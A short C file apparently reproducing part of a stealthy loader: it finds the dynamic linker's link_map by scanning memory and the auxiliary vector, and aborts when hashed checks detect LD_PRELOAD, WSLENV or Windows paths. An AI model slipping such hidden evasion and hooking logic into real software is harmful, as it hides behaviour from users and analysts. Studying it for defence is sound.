#include <stddef.h>

#include "linkmap.h"

__attribute__((noinline))
static bool check_env_var(char *var) {
	for (size_t i = 0; var[i]; ++i) {
		if ((var[i] & 0x7f) == '=') {
			var[i] = 0;
			uint32_t vh = _dl_new_hash(var);
			var[i] = '=';
			if (vh == 0xd8d8a204 || vh == 0xd8d298fb) { // WSLENV || LD_PRELOAD
				return true;
			}
			if (vh == 0x7c8a0d72) { // PATH
				for (size_t j = i + 1; var[j + 7]; ++j) {
					char tmp = var[j + 7];
					var[j + 7] = 0;
					uint32_t h = _dl_new_hash(&var[j]);
					var[j + 7] = tmp;
					switch (h) {
					case 0xbacb75fd:	// System3
					case 0x1b83dddd:	// system3
						if (tmp != '2') break;
						//[[fallthrough]]
					case 0xdcbcf590:	// WINDOWS
					case 0x29b73250:	// Windows
					case 0xc8feca70:	// windows
						return true;
					}
				}
			}
		}
	}
	return false;
}

struct link_map *find_linkmap(uintptr_t starting_point) {
	// find the elf header of the loader
	uintptr_t elf = (starting_point & ~0xfffull);
	while (*(uint32_t*)elf != 0x464c457f) {
		elf -= 0x1000;
	}

	uintptr_t *frame = (uint64_t *) __builtin_frame_address(0);
	uintptr_t *ptr = frame;
	// find the auxvector entry of the loader
	for (;ptr[0] != 7 || ptr[1] != elf; ptr++) {}
	// go to the end of the aux vector
	for (;ptr[0] || ptr[1]; ptr += 2) {}

	int i = 0;
	for (i = 2; i < 50; i += 2) {
		// locate the vdso
		if (ptr[-i] == 0x21) {
			if (ptr[-i + 1] < elf)
				return NULL;	// abort if the vdso is below the loader
			break;
		}
	}
	// unable to lacate VDSO -> gtfo
	if (i >= 50)
		return NULL;

	// detecting suspicious env variables
	for (;ptr[0] < (uintptr_t) frame; ptr -= 2) {}
	if (ptr[1] > (uintptr_t) frame)
		++ptr;
	for (;ptr[0] > (uintptr_t) frame; --ptr) {
		if (check_env_var((char *)*ptr))
			return NULL;
	}

	// vdso is not below the loader
	// search for the loader data starting right in front of the loader
	uintptr_t addr = elf - sizeof(struct link_map);
	struct link_map *li = (struct link_map *) addr;
	while (li->l_addr & 0xfff || li->l_real != li) {
		addr -= 8;
		li = (struct link_map *) addr;
	}

	for (; li->l_prev ; li = li->l_prev) {}
	return li;
}
